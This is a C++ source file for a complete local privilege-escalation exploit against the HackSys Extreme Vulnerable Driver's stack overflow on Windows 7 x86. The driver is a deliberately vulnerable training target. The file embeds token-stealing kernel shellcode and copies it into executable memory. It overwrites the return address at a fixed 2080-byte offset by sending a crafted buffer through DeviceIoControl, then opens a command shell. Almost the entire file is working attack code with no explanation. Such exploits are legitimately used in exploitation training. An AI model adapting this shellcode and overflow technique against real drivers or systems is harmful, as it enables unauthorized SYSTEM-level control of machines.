// HEVD-StackOverFlowx86Win7.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>
#include <string.h>
#include <stdio.h>

unsigned char win7x86pl[] = {
	0x60, 0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, 0x8B, 0x40, 0x50, 0x89, 0xC1,
	0xBA, 0x04, 0x00, 0x00, 0x00, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, 0x2D,
	0xB8, 0x00, 0x00, 0x00, 0x39, 0x90, 0xB4, 0x00, 0x00, 0x00, 0x75, 0xED,
	0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00, 0x8B, 0xB9, 0xF8, 0x00, 0x00, 0x00,
	0x83, 0xE2, 0xF8, 0x83, 0xE7, 0x03, 0x01, 0xFA, 0x89, 0x91, 0xF8, 0x00,
	0x00, 0x00, 0x61, 0x31, 0xC0, 0x5D, 0xC2, 0x08, 0x00
};

#define offset 2080 

#define ioctl CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)

const char kDevName[] = "\\\\.\\HackSysExtremeVulnerableDriver";

int main()
{
	HANDLE dev = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		NULL,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL
	);
	if (dev == INVALID_HANDLE_VALUE) {
		return -1;
	}

	LPVOID payload_ptr = NULL;
	printf("device opened Handle obtained at: 0x%p\n", &dev);
	LPVOID shellc_ptr = VirtualAlloc(
		0,
		sizeof(win7x86pl),
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE
	);
	if (shellc_ptr)
		memcpy(shellc_ptr, win7x86pl, sizeof(win7x86pl));
	payload_ptr = shellc_ptr;
	printf("allocated payload placed at: 0x%p\n", &payload_ptr);
	if (payload_ptr == NULL) {
		return -1;
	}
	const size_t bufSize = offset + sizeof(DWORD);
	char* lpInBuffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufSize);
	RtlFillMemory(lpInBuffer, bufSize, 0x41);
	DWORD* address_field = (DWORD*)(lpInBuffer + offset);
	*address_field = (DWORD)(payload_ptr);
	DWORD size_returned = 0;
	BOOL is_ok = DeviceIoControl(dev,
		ioctl,
		lpInBuffer,
		offset + sizeof(DWORD),
		NULL,
		0,
		&size_returned,
		NULL
	);
	printf("Triggering OverFlow....\n\n\n\n");
	HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer);
	system("cmd.exe");
	CloseHandle(dev);
	system("pause");
	return 0;
}


